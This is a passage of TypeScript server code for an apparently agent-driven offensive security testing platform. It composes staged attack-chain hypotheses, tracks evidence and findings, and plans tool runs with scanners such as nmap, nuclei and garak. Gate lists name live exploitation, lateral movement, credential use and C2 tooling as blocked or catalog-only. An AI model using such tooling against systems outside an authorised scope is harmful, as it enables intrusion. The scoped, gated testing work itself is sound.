        objective: mutation.hypothesis || 'Probe a composed local-only failure mode.',
        localProbe: mutation.localProbe || 'Use route preview and synthetic fixtures only.',
        expectedSignal: mutation.expectedSignal || 'The mutation either amplifies, narrows, or kills the route.',
        evidenceNeeded: mutation.defensiveArtifact || 'local mutation artifact',
      })),
      {
        id: 'kill_or_promote',
        label: 'Kill or promote',
        owner: 'skeptic',
        objective: 'Decide whether the chain becomes a finding, a no-route, or a defensive artifact only.',
        localProbe: 'Apply every linked falsifier before any promotion.',
        expectedSignal: 'Promotion only happens when evidence, retest, and scope receipts all line up.',
        evidenceNeeded: 'falsifier matrix, retest receipt, and owner action',
      },
    ];
    return {
      id: `chain_${String(path.id || 'pressure').replace(/[^a-zA-Z0-9_-]/g, '_')}_${seed.id}`,
      pathId: path.id || null,
      findingId: path.findingId || null,
      family,
      title: seed.title,
      intent: seed.intent,
      status,
      chainScore,
      mutationIds: selectedIds,
      lanes: uniqueStrings(selected.map(mutation => String(mutation.lane || mutation.family || 'unknown'))),
      stages,
      operatorBrief: `If ${selected.map(mutation => mutation.angle || mutation.id).join(' plus ')} compose cleanly, this becomes a ${chainScore}/100 local weird-machine candidate.`,
      falsifier: selected.map(mutation => mutation.falsifier).filter(Boolean).join(' | ') || 'Any missing local evidence, stale receipt, or non-reproducible signal kills the chain.',
      gates: uniqueStrings([
        'local synthetic fixtures only',
        'route preview before any active action',
        'no live exploitation, persistence, lateral movement, credential use, or target state change from this composer',
        'promotion requires evidence, retest, and owner action',
        ...normalizeStringList(path.noGo).slice(0, 4),
      ]),
      evidenceContract: [
        'anchor pressure path id',
        'mutation ids and lane owners',
        'canary evidence id',
        'skeptic duel evidence id',
        'local artifact for every stage',
        'falsifier result before promotion',
      ],
      toolHints: uniqueStrings([
        ...normalizeStringList(path.toolHints).slice(0, 4),
        ...selected.flatMap(mutation => normalizeStringList(mutation.toolHints)).slice(0, 8),
      ]),
    };
  }).sort((a, b) => b.chainScore - a.chainScore);

  let evidence: EvidenceEntry | null = null;
  if (params.createEvidence !== false && finding) {
    evidence = {
      id: newId('evidence'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      findingId: finding.id,
      type: 'report',
      title: `Fang chain composer: ${finding.title}`,
      summary: `Composed ${chains.length} local-only fang chains from pressure mutations; top chain ${chains[0]?.chainScore || 0}/100.`,
      source: 'system',
      uri: `tempest://pressure-chains/${String(path.id || finding.id).replace(/[^a-zA-Z0-9_-]/g, '_')}/${Date.now()}`,
      provenanceStrength: mutationStatus === 'queued' ? 'replayable' : 'context',
      resourceIds: finding.resourceIds,
      createdAt: now,
    };
    evidenceLedger.set(evidence.id, evidence);
    finding.evidenceIds = uniqueStrings([...finding.evidenceIds, evidence.id]);
    finding.updatedAt = now;
    findingsLedger.set(finding.id, finding);
  }

  let hypothesisId = normalizeStringList(path.hypothesisIds)[0] ||
    (finding ? [...hypothesisLedger.values()].find(hypothesis => hypothesis.findingIds.includes(finding.id))?.id : undefined);
  if (!hypothesisId && finding && params.createWorkOrders !== false) {
    const anchorHypothesis: HypothesisRecord = {
      id: newId('hypothesis'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      family: finding.family,
      target: finding.target,
      claim: `Fang chain route: ${finding.claim}`,
      rationale: `Anchor hypothesis created by pressure chain composer for ${path.id || finding.id}.`,
      status: chains.some(chain => chain.status === 'queued') ? 'testing' : 'open',
      confidence: Math.max(0.55, finding.confidence),
      evidenceForIds: evidence ? [evidence.id] : finding.evidenceIds,
      evidenceAgainstIds: [],
      findingIds: [finding.id],
      nextTests: chains.slice(0, 3).map(chain => chain.falsifier),
      createdAt: now,
      updatedAt: now,
    };
    hypothesisLedger.set(anchorHypothesis.id, anchorHypothesis);
    hypothesisId = anchorHypothesis.id;
  }

  const workOrders: WorkOrderRecord[] = [];
  if (params.createWorkOrders !== false && hypothesisId && hypothesisLedger.has(hypothesisId)) {
    for (const chain of chains.slice(0, 2)) {
      const title = `Fang chain: ${chain.title}`;
      const existing = [...workOrderLedger.values()].find(order =>
        order.hypothesisId === hypothesisId &&
        order.title === title &&
        order.status !== 'completed'
      );
      if (existing) {
        workOrders.push(existing);
        continue;
      }
      const order: WorkOrderRecord = {
        id: newId('work'),
        hypothesisId,
        missionId: finding?.missionId,
        operationId: finding?.operationId,
        family,
        squad: workOrderSquadForFamily(family),
        kind: 'map_impact',
        title,
        objective: `${chain.operatorBrief} Local probe only. Falsifier: ${chain.falsifier}`,
        target,
        allowedActions: ['read_only_assessment', 'local_canary', 'route_preview'],
        requiresReceipt: false,
        toolHints: normalizeStringList(chain.toolHints),
        status: chain.status === 'queued' ? 'queued' : 'blocked',
        evidenceIds: evidence ? [evidence.id] : [],
        resultSummary: chain.status === 'queued'
          ? `Queued fang chain with score ${chain.chainScore}/100 and ${chain.stages.length} stages.`
          : 'Held until mutation evidence survives the gate.',
        createdAt: now,
        updatedAt: now,
      };
      workOrderLedger.set(order.id, order);
      workOrders.push(order);
    }
  }

  const summary = {
    total: chains.length,
    queued: chains.filter(chain => chain.status === 'queued').length,
    held: chains.filter(chain => chain.status !== 'queued').length,
    maxChainScore: chains.reduce((max, chain) => Math.max(max, chain.chainScore), 0),
    workOrders: workOrders.length,
    strongestComposition: chains[0]?.title || null,
  };
  emitContractEvent('pressure.chains', {
    pathId: path.id || null,
    findingId: path.findingId || null,
    total: summary.total,
    maxChainScore: summary.maxChainScore,
    workOrderIds: workOrders.map(order => order.id),
  });

  return redactSecrets({
    schema_version: 't3mp3st_pressure_chains/v1',
    generatedAt: now,
    status: summary.queued ? 'queued' : 'hold',
    path: {
      id: path.id || null,
      title: path.title || null,
      readiness: path.readiness || null,
      posture: path.posture || null,
      offensiveScore: path.offensiveScore || 0,
      findingId: path.findingId || null,
      family: path.family || null,
    },
    doctrine: {
      stance: 'compose local-only mutations into staged weird-machine hypotheses, then kill or harden them with evidence',
      noLiveAction: true,
    },
    summary,
    chains,
    evidence,
    workOrders,
    nextActions: [
      summary.queued ? 'Assign the strongest fang chain to specialist agents with each stage, gate, and falsifier attached.' : 'Run canary, duel, and mutation gauntlet before trusting composed chains.',
      'Treat composed chains as hypotheses until every stage has a local artifact and falsifier result.',
      'Promote only chains that produce a concrete patch, detector, runbook, or regression gate.',
    ],
  }) as Record<string, any>;
}

function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, unknown>): MemoryProposal {
  const now = nowIso();
  const content = redactString(String(input.content || '').trim()).slice(0, 1200);
  const type = normalizeMemoryType(input.type);
  const fingerprint = typeof input.fingerprint === 'string' && input.fingerprint.trim()
    ? input.fingerprint.trim()
    : memoryFingerprint(type, content);
  const sourceEvidenceIds = normalizeStringList(input.sourceEvidenceIds).filter(id => evidenceLedger.has(id));
  const sourceFindingIds = normalizeStringList(input.sourceFindingIds).filter(id => findingsLedger.has(id));
  const sourceRetestIds = normalizeStringList(input.sourceRetestIds).filter(id => retestLedger.has(id));
  const duplicateCandidates = [...memoryProposals.values()]
    .filter(proposal => proposalFingerprint(proposal) === fingerprint)
    .sort((a, b) => {
      const rank = (proposal: MemoryProposal) => proposal.status === 'pending' ? 0 : proposal.status === 'accepted' ? 1 : 2;
      return rank(a) - rank(b) || b.updatedAt.localeCompare(a.updatedAt);
    });
  const duplicate = duplicateCandidates[0];
  if (duplicate) {
    duplicate.fingerprint = fingerprint;
    duplicate.observationCount = Math.max(1, duplicate.observationCount || 1) + 1;
    duplicate.lastSeenAt = now;
    duplicate.updatedAt = now;
    duplicate.confidence = Math.max(duplicate.confidence, clampConfidence(input.confidence ?? duplicate.confidence));
    duplicate.sourceEvidenceIds = uniqueStrings([...duplicate.sourceEvidenceIds, ...sourceEvidenceIds]);
    duplicate.sourceFindingIds = uniqueStrings([...duplicate.sourceFindingIds, ...sourceFindingIds]);
    duplicate.sourceRetestIds = uniqueStrings([...duplicate.sourceRetestIds, ...sourceRetestIds]);
    memoryProposals.set(duplicate.id, duplicate);

    if (duplicate.memoryEntryId) {
      const entry = memoryCapsule.get(duplicate.memoryEntryId);
      if (entry) {
        entry.fingerprint = fingerprint;
        entry.observationCount = Math.max(entry.observationCount || 1, duplicate.observationCount);
        entry.sourceProposalIds = uniqueStrings([...(entry.sourceProposalIds || []), duplicate.id]);
        memoryCapsule.set(entry.id, entry);
      }
    }

    emitContractEvent('memory.reobserved', {
      proposalId: duplicate.id,
      type: duplicate.type,
      fingerprint,
      observationCount: duplicate.observationCount,
      status: duplicate.status,
    });
    return duplicate;
  }

  const proposal: MemoryProposal = {
    id: typeof input.id === 'string' ? input.id : newId('memprop'),
    status: normalizeMemoryStatus(input.status, 'pending'),
    type,
    content,
    source: typeof input.source === 'string' && input.source.trim() ? input.source.trim() : 'manual-proposal',
    confidence: clampConfidence(input.confidence ?? 0.7),
    rationale: typeof input.rationale === 'string' && input.rationale.trim()
      ? redactString(input.rationale.trim()).slice(0, 1200)
      : 'Proposed memory requires operator review before promotion.',
    sourceMissionId: typeof input.sourceMissionId === 'string' ? input.sourceMissionId : undefined,
    sourceOperationId: typeof input.sourceOperationId === 'string' ? input.sourceOperationId : undefined,
    sourceEvidenceIds,
    sourceFindingIds,
    sourceRetestIds,
    createdAt: now,
    updatedAt: now,
    fingerprint,
    observationCount: Math.max(1, Number(input.observationCount) || 1),
    lastSeenAt: now,
  };
  memoryProposals.set(proposal.id, proposal);
  emitContractEvent('memory.proposed', { proposalId: proposal.id, type: proposal.type, source: proposal.source, fingerprint });
  return proposal;
}

function buildLearningReview(input: Record<string, unknown>): { proposals: MemoryProposal[]; source: Record<string, unknown> } {
  const missionId = typeof input.missionId === 'string' ? input.missionId : '';
  const operationId = typeof input.operationId === 'string' ? input.operationId : '';
  const evidence = [...evidenceLedger.values()].filter(entry =>
    (missionId && entry.missionId === missionId) || (operationId && entry.operationId === operationId)
  );
  const findings = [...findingsLedger.values()].filter(finding =>
    (missionId && finding.missionId === missionId) || (operationId && finding.operationId === operationId)
  );
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) || (missionId && retest.missionId === missionId) || (operationId && retest.operationId === operationId)
  );
  const passedRetests = retests.filter(retest => retest.status === 'passed');
  const family = findings[0]?.family || normalizeMissionFamily(input.family, 'web_api');
  const proposals: MemoryProposal[] = [];

  if (evidence.length || findings.length || retests.length) {
    proposals.push(createMemoryProposal({
      type: 'procedure',
      content: `${family} missions should preserve traceability before promotion: ${evidence.length} evidence item(s), ${findings.length} finding(s), and ${passedRetests.length} passed retest(s) were linked in this run.`,
      source: 'learning.run_review',
      confidence: passedRetests.length ? 0.82 : 0.68,
      rationale: 'Run-level learning proposal derived from the mission bundle chain of custody.',
      sourceMissionId: missionId || undefined,
      sourceOperationId: operationId || undefined,
      sourceEvidenceIds: evidence.map(entry => entry.id),
      sourceFindingIds: findings.map(finding => finding.id),
      sourceRetestIds: retests.map(retest => retest.id),
    }));
  }

  for (const finding of findings.filter(item => item.status === 'resolved' || item.confidence >= 0.8).slice(0, 4)) {
    proposals.push(createMemoryProposal({
      type: finding.family === 'ai_red_team' || finding.family === 'agent_warfare' ? 'boundary' : 'procedure',
      content: `${finding.family} lesson: ${finding.claim} Defensive artifact: ${finding.recommendedFix || 'attach fix guidance before promotion'}.`,
      source: 'learning.finding_review',
      confidence: finding.confidence,
      rationale: 'Finding-level learning proposal derived from a high-confidence or resolved finding.',
      sourceMissionId: finding.missionId,
      sourceOperationId: finding.operationId,
      sourceEvidenceIds: finding.evidenceIds,
      sourceFindingIds: [finding.id],
      sourceRetestIds: finding.retestIds,
    }));
  }

  for (const retest of passedRetests.slice(0, 4)) {
    const finding = findingsLedger.get(retest.findingId);
    proposals.push(createMemoryProposal({
      type: 'procedure',
      content: `Retest pattern to keep: ${retest.method} Acceptance criteria: ${retest.acceptanceCriteria.join('; ') || 'attach explicit criteria'}.`,
      source: 'learning.retest_review',
      confidence: Math.max(0.75, finding?.confidence || 0.75),
      rationale: 'Passed retest can become reusable regression practice after review.',
      sourceMissionId: retest.missionId,
      sourceOperationId: retest.operationId,
      sourceEvidenceIds: retest.evidenceIds,
      sourceFindingIds: [retest.findingId],
      sourceRetestIds: [retest.id],
    }));
  }

  if (!proposals.length) {
    proposals.push(createMemoryProposal({
      type: 'open_question',
      content: `No durable memory should be accepted yet for ${missionId || operationId || 'this run'} because no evidence/finding/retest chain was available.`,
      source: 'learning.run_review',
      confidence: 0.55,
      rationale: 'The safest learning action is to name the missing receipts instead of inventing memory.',
      sourceMissionId: missionId || undefined,
      sourceOperationId: operationId || undefined,
    }));
  }

  return {
    proposals,
    source: {
      missionId: missionId || null,
      operationId: operationId || null,
      family,
      evidence: evidence.length,
      findings: findings.length,
      retests: retests.length,
      passedRetests: passedRetests.length,
    },
  };
}

function healthPayload(): Record<string, unknown> {
  const cmd = getTempestCommand();
  const llmConfig = config.getLLMConfig();
  const activeMission = cmd?.mission.getActiveMission();
  return {
    ok: true,
    status: 'operational',
    mode: currentMode(),
    organ: 't3mp3st',
    version: '0.2.1',
    apiVersion: 'v1',
    llm: {
      configured: Boolean(llmConfig.apiKey) || providerRunsKeyless(llmConfig.provider),
      connected: Boolean(llm) || llmConfig.provider === 'codex',
      provider: llmConfig.provider,
      model: llmConfig.model,
      codexAccountMode: '/api/codex/status',
    },
    storage: {
      ok: true,
      driver: stateRoot() === 'memory' ? 'memory' : 'filesystem',
      path: stateRoot(),
      stateFile: stateFilePath(),
      eventsFile: eventsFilePath(),
    },
    mission: {
      active: cmd ? cmd.isRunning() : false,
      id: activeMission?.id || null,
    },
    events: {
      sse: '/api/events',
      heartbeat: 'heartbeat',
      legacyHeartbeat: 'ping',
    },
    missionDispatch: true,
    approvals: {
      endpoint: '/api/approvals',
      pending: [...approvalRequests.values()].filter(approval => approval.status === 'pending').length,
    },
    resources: {
      endpoint: '/api/resource-packs',
      packs: RESOURCE_PACKS.length,
      workflowPresets: WORKFLOW_PRESETS.length,
      promptPacks: AGENT_PROMPT_PACKS.length,
      runbooks: OPERATOR_RUNBOOKS.length,
      forefrontPressureLanes: FOREFRONT_PRESSURE_LANES.length,
    },
    ledgers: {
      evidence: evidenceLedger.size,
      hypotheses: hypothesisLedger.size,
      workOrders: workOrderLedger.size,
      watchCycles: watchCycleLedger.size,
      findings: findingsLedger.size,
      retests: retestLedger.size,
    },
    learning: {
      memoryEntries: memoryCapsule.size,
      memoryProposals: memoryProposals.size,
      improvementProposals: improvementProposals.size,
      proposalFlow: '/api/learning/run-review -> /api/memory/proposals/:id/accept',
    },
    arsenal: {
      ...summarizeToolCatalog(),
      frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
      adapterCoverage: Math.min(100, Math.round((TOOL_ADAPTERS.length / FRONTIER_ARSENAL_MILESTONE) * 100)),
    },
    timestamp: nowIso(),
    tools_available: SAFE_COMMANDS.length,
  };
}

async function inspectToolAvailability(): Promise<Array<{ id: string; name: string; displayName: string; binary: string; available: boolean; path?: string; category: string; risk: string; execution: string; networked: boolean; requiredFor: string[]; installHint: string; commandHint: string; parserStatus: string; note?: string }>> {
  const requiredFor: Record<string, string[]> = {
    file: ['field_drill', 'local_artifact_inspection'],
    curl: ['api_smoke', 'http_probe'],
    dig: ['dns_recon'],
    nmap: ['port_recon'],
    git: ['repo_context'],
  };
  const adapters = [...TOOL_ADAPTERS, {
    id: 'git',
    binary: 'git',
    name: 'Git',
    category: 'core' as const,
    families: ['code_supply_chain' as const],
    risk: 'local_read' as const,
    execution: 'safe_command' as const,
    networked: false,
    evidenceKinds: ['repo_context'],
    outputFormats: ['text'],
    installHint: 'Install Git from Xcode command line tools or your package manager.',
    commandHint: 'git status --short',
    parserStatus: 'text' as const,
    notes: 'Repository context for local evidence and provenance.',
  }];
  return Promise.all(adapters.map(async adapter => {
    try {
      const { stdout } = await execFileAsync('which', [adapter.binary], { timeout: 1500 });
      return {
        id: adapter.id,
        name: adapter.binary,
        displayName: adapter.name,
        binary: adapter.binary,
        available: true,
        path: stdout.trim(),
        category: adapter.category,
        risk: adapter.risk,
        execution: adapter.execution,
        networked: adapter.networked,
        requiredFor: requiredFor[adapter.binary] || adapter.evidenceKinds,
        installHint: adapter.installHint,
        commandHint: adapter.commandHint,
        parserStatus: adapter.parserStatus,
      };
    } catch {
      return {
        id: adapter.id,
        name: adapter.binary,
        displayName: adapter.name,
        binary: adapter.binary,
        available: false,
        category: adapter.category,
        risk: adapter.risk,
        execution: adapter.execution,
        networked: adapter.networked,
        requiredFor: requiredFor[adapter.binary] || adapter.evidenceKinds,
        installHint: adapter.installHint,
        commandHint: adapter.commandHint,
        parserStatus: adapter.parserStatus,
        note: requiredFor[adapter.binary]?.length ? 'Install to unlock this workflow.' : adapter.notes,
      };
    }
  }));
}

async function buildPreflightReport(): Promise<Record<string, unknown>> {
  const tools = await inspectToolAvailability();
  const llmConfig = config.getLLMConfig();
  const requiredTools = new Set(['file', 'curl', 'git']);
  const missingRequired = tools.filter(tool => requiredTools.has(tool.name) && !tool.available).map(tool => tool.name);
  const missingRecon = tools.filter(tool => ['nmap', 'dig'].includes(tool.name) && !tool.available).map(tool => tool.name);
  const missingHighValue = tools.filter(tool =>
    ['nmap', 'nuclei', 'ffuf', 'subfinder', 'httpx', 'katana', 'semgrep', 'gitleaks', 'trivy', 'garak', 'promptfoo', 'slither', 'forge', 'radamsa'].includes(tool.name) &&
    !tool.available
  ).map(tool => tool.name);
  const commandReadyTools = tools.filter(tool => tool.id !== 'git' && ['safe_command', 'receipt_required'].includes(tool.execution));
  const installedAdapters = tools.filter(tool => tool.available && tool.id !== 'git').length;
  const installedCommandReady = commandReadyTools.filter(tool => tool.available).length;
  const installedReadiness = commandReadyTools.length ? Math.round((installedCommandReady / commandReadyTools.length) * 100) : 0;
  const adapterCoverage = Math.min(100, Math.round((TOOL_ADAPTERS.length / FRONTIER_ARSENAL_MILESTONE) * 100));
  const checks = [
    { id: 'api', label: 'API server', status: 'ok', detail: `mode=${currentMode()}` },
    { id: 'storage', label: 'State storage', status: 'ok', detail: stateRoot() },
    { id: 'llm', label: 'LLM provider', status: llmConfig.apiKey ? 'ok' : 'warn', detail: llmConfig.apiKey ? `${llmConfig.provider}:${llmConfig.model}` : 'No API key configured; local contracts and drills still work.' },
    { id: 'tools-core', label: 'Core tools', status: missingRequired.length ? 'block' : 'ok', detail: missingRequired.length ? `Missing ${missingRequired.join(', ')}` : 'file, curl, and git detected' },
    { id: 'tools-recon', label: 'Recon tools', status: missingRecon.length ? 'warn' : 'ok', detail: missingRecon.length ? `Missing ${missingRecon.join(', ')}` : 'nmap and dig detected' },
    { id: 'arsenal-catalog', label: 'Tool adapter catalog', status: TOOL_ADAPTERS.length >= 45 ? 'ok' : 'warn', detail: `${TOOL_ADAPTERS.length}/${FRONTIER_ARSENAL_MILESTONE} wired / ${installedCommandReady}/${commandReadyTools.length} installed / ${missingHighValue.length} high-value missing` },
    { id: 'resources', label: 'Knowledge packs', status: RESOURCE_PACKS.length >= 14 ? 'ok' : 'warn', detail: `${RESOURCE_PACKS.length} packs / ${WORKFLOW_PRESETS.length} guided starts` },
    { id: 'prompt-packs', label: 'Agent prompt packs', status: AGENT_PROMPT_PACKS.length >= 5 ? 'ok' : 'warn', detail: `${AGENT_PROMPT_PACKS.length} family prompts with evidence contracts` },
    { id: 'runbooks', label: 'Operator runbooks', status: OPERATOR_RUNBOOKS.length >= 5 ? 'ok' : 'warn', detail: `${OPERATOR_RUNBOOKS.length} mission families with next-action guidance` },
    { id: 'forefront-radar', label: 'Forefront radar', status: FOREFRONT_PRESSURE_LANES.length >= 6 ? 'ok' : 'warn', detail: `${FOREFRONT_PRESSURE_LANES.length} adversarial pressure lanes` },
    { id: 'ledgers', label: 'Ledgers', status: 'ok', detail: `${evidenceLedger.size} evidence / ${hypothesisLedger.size} hypotheses / ${workOrderLedger.size} work orders / ${watchCycleLedger.size} watch cycles / ${findingsLedger.size} findings / ${retestLedger.size} retests` },
    { id: 'scopeguard', label: 'ScopeGuard', status: 'ok', detail: `${[...approvalRequests.values()].filter(approval => approval.status === 'pending').length} pending receipts` },
  ];
  const score = Math.round((checks.filter(check => check.status === 'ok').length / checks.length) * 100);
  return {
    ok: !missingRequired.length,
    score,
    mode: currentMode(),
    checks,
    tools,
    arsenal: {
      ...summarizeToolCatalog(),
      installedAdapters,
      installedCommandReady,
      installedReadiness,
      adapterCoverage,
      frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
      missingHighValue,
      endpoints: {
        catalog: '/api/arsenal/catalog',
        status: '/api/arsenal/status',
        plan: '/api/arsenal/plan',
        activation: '/api/arsenal/activation',
      },
    },
    resources: {
      packs: RESOURCE_PACKS.length,
      workflowPresets: WORKFLOW_PRESETS.length,
      promptPacks: AGENT_PROMPT_PACKS.length,
      runbooks: OPERATOR_RUNBOOKS.length,
      forefrontPressureLanes: FOREFRONT_PRESSURE_LANES.length,
    },
    ledgers: {
      evidence: evidenceLedger.size,
      hypotheses: hypothesisLedger.size,
      workOrders: workOrderLedger.size,
      watchCycles: watchCycleLedger.size,
      findings: findingsLedger.size,
      retests: retestLedger.size,
    },
    learning: {
      memoryEntries: memoryCapsule.size,
      memoryProposals: memoryProposals.size,
      improvementProposals: improvementProposals.size,
      persistence: stateRoot() === 'memory' ? 'ephemeral' : 'filesystem',
    },
    timestamp: nowIso(),
  };
}

async function buildArsenalStatus(family?: string): Promise<Record<string, unknown>> {
  const normalizedFamily = family ? normalizeMissionFamily(family, 'web_api') : undefined;
  const catalog = adaptersForFamily(normalizedFamily);
  const availability = await inspectToolAvailability();
  const availabilityById = new Map(availability.map(tool => [tool.id, tool]));
  const tools = catalog.map(adapter => ({
    ...adapter,
    available: availabilityById.get(adapter.id)?.available || false,
    path: availabilityById.get(adapter.id)?.path || null,
    status: availabilityById.get(adapter.id)?.available
      ? 'installed'
      : adapter.execution === 'catalog_only'
        ? 'catalog_only'
        : adapter.execution === 'import_only'
          ? 'import_only'
          : 'missing',
  }));
  const installed = tools.filter(tool => tool.available).length;
  const commandReadyTools = tools.filter(tool => tool.execution === 'safe_command' || tool.execution === 'receipt_required');
  const commandReady = commandReadyTools.length;
  const installedCommandReady = commandReadyTools.filter(tool => tool.available).length;
  const missingCommandReady = commandReadyTools.filter(tool => !tool.available).map(tool => tool.id);
  return {
    schema_version: 't3mp3st_arsenal_status/v1',
    family: normalizedFamily || 'all',
    summary: {
      ...summarizeToolCatalog(catalog),
      installed,
      installedCommandReady,
      missingCommandReady: missingCommandReady.length,
      readiness: commandReady ? Math.round((installedCommandReady / commandReady) * 100) : 0,
      unmodeled: commandReady === 0,
      frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
      adapterCoverage: normalizedFamily ? null : Math.min(100, Math.round((TOOL_ADAPTERS.length / FRONTIER_ARSENAL_MILESTONE) * 100)),
    },
    tools,
    missingCommandReady,
    policy: {
      genericExecution: '/api/tools/execute only accepts command-ready allowlisted binaries.',
      approval: 'Networked or active commands require ScopeGuard receipts unless they target local loopback/lab fixtures.',
      catalogOnly: 'Credential, post-exploitation, C2, and broad exploitation platforms stay catalog-only until narrow adapters and gates exist.',
      evidenceFlow: 'Tool output should become evidence, then findings, then retests, then explicit memory proposals.',
    },
  };
}

function buildArsenalPlan(params: Record<string, unknown>): Record<string, unknown> {
  const family = normalizeMissionFamily(params.family, 'web_api');
  const target = normalizeTargetValue(params.target || params.scope || 'local-lab');
  const requested = Array.isArray(params.tools) ? params.tools.map(String) : [];
  const candidates = requested.length
    ? TOOL_ADAPTERS.filter(adapter => requested.includes(adapter.id) || requested.includes(adapter.binary))
    : adaptersForFamily(family);
  const phasePriority: Record<string, number> = {
    osint: 1,
    dns: 2,
    network: 3,
    web: 4,
    api: 5,
    vulnerability: 6,
    supply_chain: 3,
    smart_contract: 3,
    crypto: 3,
    fuzzing: 4,
    mobile: 4,
    secrets: 4,
    container: 5,
    cloud: 6,
    ai_agent: 3,
    reverse: 3,
    forensics: 4,
    reporting: 9,
    core: 0,
    credentials: 8,
    post_exploitation: 8,
  };
  const steps = [...candidates]
    .sort((a, b) => (phasePriority[a.category] || 7) - (phasePriority[b.category] || 7) || a.id.localeCompare(b.id))
    .map((adapter, index) => {
      const requiresReceipt = adapter.execution === 'receipt_required' || (adapter.networked && !isLoopbackOrLabTarget(target));
      return {
        step: index + 1,
        adapterId: adapter.id,
        tool: adapter.name,
        category: adapter.category,
        risk: adapter.risk,
        execution: adapter.execution,
        commandHint: adapter.commandHint.replace(/example\.com/g, hostFromTarget(target) || 'example.com'),
        evidenceKinds: adapter.evidenceKinds,
        parserStatus: adapter.parserStatus,
        gate: adapter.execution === 'catalog_only' || adapter.execution === 'import_only'
          ? 'adapter_needed'
          : requiresReceipt
            ? 'approval_receipt_required'
            : 'local_or_read_only',
        nextEvidenceMove: `Attach ${adapter.evidenceKinds[0] || 'tool_output'} to /api/evidence before creating or updating a finding.`,
      };
    });
  return {
    schema_version: 't3mp3st_arsenal_plan/v1',
    family,
    target,
    objective: typeof params.objective === 'string' ? params.objective : 'Build a scoped, evidence-first tool plan.',
    steps,
    installPlan: candidates
      .filter(adapter => adapter.execution !== 'catalog_only' && adapter.execution !== 'import_only')
      .map(adapter => ({ adapterId: adapter.id, binary: adapter.binary, installHint: adapter.installHint })),
    stopConditions: [
      'No explicit scope receipt for external targets.',
      'A tool would mutate state, brute force credentials, or perform intrusive validation beyond the mission contract.',
      'Evidence cannot be redacted or mapped back to an authorized asset.',
    ],
  };
}

function buildArsenalActivationPlan(): Record<string, unknown> {
  const groups: Record<string, Array<Record<string, string>>> = {
    preinstalled: [],
    brew: [],
    npm: [],
    pipx: [],
    manual: [],
    gated: [],
  };
  for (const adapter of TOOL_ADAPTERS) {
    const item = {
      id: adapter.id,
      binary: adapter.binary,
      name: adapter.name,
      category: adapter.category,
      execution: adapter.execution,
      installHint: adapter.installHint,
    };
    if (adapter.execution === 'catalog_only' || adapter.execution === 'import_only') {
      groups.gated.push(item);
    } else if (/usually preinstalled/i.test(adapter.installHint)) {
      groups.preinstalled.push(item);
    } else if (/npm install -g/i.test(adapter.installHint)) {
      groups.npm.push(item);
    } else if (/brew install/i.test(adapter.installHint)) {
      groups.brew.push(item);
    } else if (/pipx install/i.test(adapter.installHint)) {
      groups.pipx.push(item);
    } else {
      groups.manual.push(item);
    }
  }
  return {
    schema_version: 't3mp3st_arsenal_activation/v1',
    summary: {
      ...summarizeToolCatalog(),
      frontierMilestone: FRONTIER_ARSENAL_MILESTONE,
      adapterCoverage: Math.min(100, Math.round((TOOL_ADAPTERS.length / FRONTIER_ARSENAL_MILESTONE) * 100)),
    },
    groups,
    localPlanDoc: 'docs/ARSENAL_ACTIVATION_PLAN.md',
    policy: {
      installsAreManual: 'This endpoint reports an activation plan only; it never installs binaries.',
      gatesStayOn: 'Receipt-required, catalog-only, and import-only tools keep their execution gates after installation.',
    },
  };
}

function emitContractEvent(type: string, payload: Record<string, unknown>): void {
  broadcastEvent(type, {
    id: newId('evt'),
    ts: nowIso(),
    mode: currentMode(),
    ...payload,
  });
  void appendStateEvent(type, payload).catch(error => {
    console.warn(`[T3MP3ST] Event persistence failed: ${error.message || error}`);
  });
  schedulePersist(type);
}

// =============================================================================
// SERVER-SENT EVENTS (SSE) - REAL-TIME EVENT STREAMING
// =============================================================================

/** Connected SSE clients */
const sseClients: Set<Response> = new Set();

/** Broadcast an event to all connected SSE clients */
export function broadcastEvent(event: string, data: Record<string, unknown>): void {
  const payload = `event: ${event}\ndata: ${JSON.stringify(redactSecrets(data))}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(payload);
    } catch {
      sseClients.delete(client);
    }
  }
}

// Bound concurrent SSE clients — each holds a Response + its own 30s heartbeat interval. A
// single operator uses a handful of dashboard tabs; this only rejects a pathological flood.
const MAX_SSE_CLIENTS = 64;
app.get('/api/events', (_req: Request, res: Response) => {
  const origin = _req.get('origin');
  // #84: allow the operator's own same-origin UI on a non-loopback (opted-in) bind; foreign
  // origins still fail the loopback check AND the Host match, so they remain rejected.
  const sameOriginNetworkBind = !HOST_IS_LOOPBACK && isSameOriginAsHost(origin, _req.headers.host);
  if (origin && !isLoopbackOrigin(origin) && !sameOriginNetworkBind) {
    res.status(403).json({
      error: 'Cross-origin event stream rejected',
      detail: 'The SSE feed may contain live mission/task/finding metadata and is only available to the localhost UI.',
    });
    return;
  }
  if (sseClients.size >= MAX_SSE_CLIENTS) {
    res.status(503).json({ error: 'Too many event-stream clients', detail: `SSE client cap (${MAX_SSE_CLIENTS}) reached — close an existing dashboard tab and retry.` });
    return;
  }
  // SSE headers. Do not use a wildcard ACAO here: browsers can open EventSource
  // cross-origin, and the event feed carries live operational metadata. Reflect
  // only a trusted loopback Origin; same-origin/no-Origin clients need no CORS header.
  const headers: Record<string, string> = {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
  };
  if (origin) headers['Access-Control-Allow-Origin'] = origin;
  res.writeHead(200, headers);

  // Send initial heartbeat
  res.write('event: connected\ndata: {"status":"connected"}\n\n');

  sseClients.add(res);

  // Send heartbeat every 30s to keep connection alive
  const heartbeat = setInterval(() => {
    try {
      res.write('event: heartbeat\ndata: {}\n\n');
      res.write('event: ping\ndata: {}\n\n');
    } catch {
      clearInterval(heartbeat);
      sseClients.delete(res);
    }
  }, 30000);

  // Cleanup on client disconnect
  _req.on('close', () => {
    clearInterval(heartbeat);
    sseClients.delete(res);
  });
});

// =============================================================================
// API ENDPOINTS - HEALTH & STATUS
// =============================================================================

app.get(['/health', '/api/health'], (_req: Request, res: Response) => {
  res.json({
    ...healthPayload(),
    payload_db_size: Object.values(PAYLOAD_DB).reduce((sum, cat) =>
